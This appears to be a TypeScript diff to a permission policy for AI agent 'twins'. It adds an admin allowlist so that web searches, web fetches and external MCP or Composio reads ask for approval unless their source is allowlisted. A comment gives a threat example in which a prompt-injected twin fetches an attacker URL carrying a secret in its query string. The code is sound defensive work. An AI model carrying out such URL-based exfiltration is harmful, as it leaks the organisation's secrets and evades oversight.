@@ -3,6 +3,30 @@
 
 import type { ToolPolicyOverride, ToolPolicyOverrides } from "./tool-policy-overrides";
 
+/**
+ * Admin allowlist for reads that leave the machine (read-allowlist.ts). A
+ * read through an MCP server or Composio toolkit sends query content to that
+ * provider, so it auto-runs only when the admin listed its source; otherwise
+ * it asks. Internal scoped reads (profile, org brain, meeting files) never ask.
+ */
+export type ReadAllowlist = {
+  /** Org MCP server keys (mcp__<server>__…) whose read tools auto-run. */
+  servers: string[];
+  /** Composio toolkit slugs (gmail, github…) whose read tools auto-run. */
+  composioToolkits: string[];
+  /** WebSearch sends the query to the search provider: off unless enabled. */
+  webSearch: boolean;
+  /** Lets a per-employee "allow" turn on WebFetch/WebSearch for that twin. */
+  webOverrides: boolean;
+};
+
+export type ToolPolicyContext = { readAllowlist?: ReadAllowlist };
+
+/** In-process MCP servers: reads stay inside the app's own data. */
+const INTERNAL_MCP_SERVERS = new Set(["org_brain", "artifacts", "meeting_scratch", "twin_consult"]);
+
+const WEB_TOOLS = new Set(["WebFetch", "WebSearch"]);
+
 export type ToolDecision =
   | { kind: "allow" }
   | { kind: "ask"; reason: string }
@@ -38,10 +62,9 @@ const LOCAL_SAFE_TOOLS = new Set([
   "Glob",
   "Grep",
   "Write",      // path-gated to scratch/<employeeId>/ via PreToolUse hook (sdk-defaults.ts)
-  "WebSearch",  // CEO opted into web research; cost absorbed
-  // WebFetch is NOT here: the URL itself can carry data out (a prompt-injected
-  // twin could fetch https://attacker/?q=<secret>), so it asks. A CEO can opt
-  // a twin back in with a per-employee "allow" override.
+  // WebSearch and WebFetch are NOT here: the query or URL carries data out
+  // (a prompt-injected twin could fetch https://attacker/?q=<secret>). They
+  // ask unless the admin's read allowlist enables them.
   "ToolSearch", // SDK helper for tool discovery — purely internal
   "TodoWrite",  // SDK planning scratchpad — purely internal
   "StructuredOutput", // SDK's final-report tool (shift reports) — no side effects
@@ -69,6 +92,28 @@ const ALWAYS_BLOCKED_TOOLS = new Set([
   "enterworktree",
   "exitworktree",
 ]);
+
+/** Pure verb test: a read action with no mutating segment. Says nothing
+ *  about where the read goes; see classifyTool for that. */
+export function isReadOnlyAction(toolName: string): boolean {
+  const name = bareName(toolName);
+  if (readActionPrecedesBlockedTerm(name)) return false;
+  return READ_ONLY_PATTERNS.some((re) => re.test(name)) && !MUTATING_SEGMENT.test(name);
+}
+
+function mcpServerOf(toolName: string): string | undefined {
+  return /^mcp__([a-z0-9_-]+?)__/i.exec(toolName)?.[1]?.toLowerCase();
+}
+
+/** Internal reads always; external ones only from an allowlisted source. */
+function readSourceAllowed(original: string, name: string, allow: ReadAllowlist | undefined): boolean {
+  const server = mcpServerOf(original);
+  if (server && INTERNAL_MCP_SERVERS.has(server)) return true;
+  if (!allow) return false;
+  if (server && server !== "composio") return allow.servers.some((s) => s.toLowerCase() === server);
+  const toolkit = name.split("_")[0]?.toLowerCase() ?? "";
+  return allow.composioToolkits.some((t) => t.toLowerCase() === toolkit);
+}
 
 function overrideFor(
   original: string,
@@ -148,6 +193,7 @@ export function classifyTool(
   toolName: string,
   input: Record<string, unknown> | undefined,
   overrides?: ToolPolicyOverrides,
+  ctx: ToolPolicyContext = {},
 ): ToolDecision {
   const original = toolName || "";
   const name = bareName(original); // strip mcp__server__ prefix
@@ -166,13 +212,27 @@ export function classifyTool(
   // A permissive preference cannot turn a destructive-looking action into an
   // automatic approval. In particular, reads of transfer/removal records stay
   // in the existing cautious path below.
-  if (override === "allow" && !matchesHardBlockPattern(name)) {
+  // A per-employee "allow" can't open the web on its own: that needs the
+  // admin's webOverrides switch.
+  const webGated = WEB_TOOLS.has(name) && !ctx.readAllowlist?.webOverrides;
+  if (override === "allow" && !matchesHardBlockPattern(name) && !webGated) {
     return { kind: "allow" };
   }
 
   // Local sandbox + SDK built-in tools never need approval.
   if (LOCAL_SAFE_TOOLS.has(original) || LOCAL_SAFE_TOOLS.has(name)) {
     return { kind: "allow" };
+  }
+
+  if (name === "WebSearch") {
+    if (ctx.readAllowlist?.webSearch) return { kind: "allow" };
+    const query = typeof input?.query === "string" ? (input.query as string) : "";
+    return {
+      kind: "ask",
+      reason: query
+        ? `About to search the web for "${query.slice(0, 120)}". The query goes to the search provider.`
+        : "About to search the web. The query goes to the search provider.",
+    };
   }
 
   if (name === "WebFetch") {
@@ -196,11 +256,15 @@ export function classifyTool(
     };
   }
 
-  // Auto-allow read-only patterns.
-  for (const re of READ_ONLY_PATTERNS) {
-    if (re.test(name) && !MUTATING_SEGMENT.test(name)) {
-      return { kind: "allow" };
-    }
+  // Reads: auto only from an internal or admin-allowlisted source, because
+  // the call sends query content to that provider.
+  if (READ_ONLY_PATTERNS.some((re) => re.test(name)) && !MUTATING_SEGMENT.test(name)) {
+    if (readSourceAllowed(original, name, ctx.readAllowlist)) return { kind: "allow" };
+    const source = mcpServerOf(original) ?? "an external service";
+    return {
+      kind: "ask",
+      reason: `${name} sends query content to ${source === "composio" ? `${name.split("_")[0]} (via Composio)` : source}. An admin can allowlist this source in Settings.`,
+    };
   }
 
   // Slack — sends to channels or DMs.
